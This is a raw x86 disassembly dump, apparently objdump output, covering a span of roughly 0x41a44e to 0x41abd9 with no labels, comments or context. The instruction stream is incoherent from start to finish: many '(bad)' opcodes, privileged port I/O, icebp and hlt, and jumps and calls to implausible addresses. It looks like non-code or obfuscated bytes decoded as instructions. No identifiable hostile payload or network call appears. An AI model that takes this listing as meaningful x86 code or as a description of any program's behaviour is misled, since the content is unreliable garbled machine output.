  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
